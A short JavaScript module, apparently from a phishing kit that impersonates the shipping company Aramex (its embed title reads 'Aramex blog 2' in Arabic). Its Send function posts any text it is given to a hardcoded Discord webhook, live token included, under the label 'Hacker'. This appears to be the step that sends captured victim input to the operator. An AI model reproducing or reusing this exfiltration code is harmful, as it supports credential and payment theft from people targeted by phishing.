import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1320752425459650570/KvRv9sL1x8SikqKkGSR_S8gQXdda3XHyug2c2dOP_y5XJ7eCichCoMCHvq9HfFLDSFO7",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
